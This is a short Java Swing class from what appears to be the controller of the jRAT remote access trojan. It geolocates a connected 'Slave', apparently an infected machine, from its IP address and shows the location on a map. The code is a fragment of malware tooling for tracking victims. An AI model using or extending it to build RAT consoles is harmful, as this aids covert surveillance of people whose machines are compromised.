package io.jrat.controller.ui.panels;

import io.jrat.controller.ErrorDialog;
import io.jrat.controller.Slave;
import io.jrat.controller.net.GeoIP;
import io.jrat.controller.ui.components.JRemoteScreenPane;
import io.jrat.controller.ui.components.TableModel;
import java.awt.BorderLayout;
import java.util.Map;
import javax.swing.JTable;


@SuppressWarnings("serial")
public class PanelControlTrace extends PanelControlParent {

	private JTable table;

	public TableModel getModel() {
		return (TableModel) table.getModel();
	}

	public PanelControlTrace(Slave sl) {
		super(sl);
		setLayout(new BorderLayout(0, 0));

		final JRemoteScreenPane.ImagePanel panel = new JRemoteScreenPane().new ImagePanel();
		add(panel);
		
		new Thread(new Runnable() {
			public void run() {
				try {
					Map<String, String> info = GeoIP.getInfo(slave);
					panel.update(GeoIP.getMap(4, Double.parseDouble(info.get("latitude")), Double.parseDouble(info.get("longitude")), true));
				} catch (Exception e) {
					e.printStackTrace();
					ErrorDialog.create(e);
				}
			}
		}).start();
	}
}
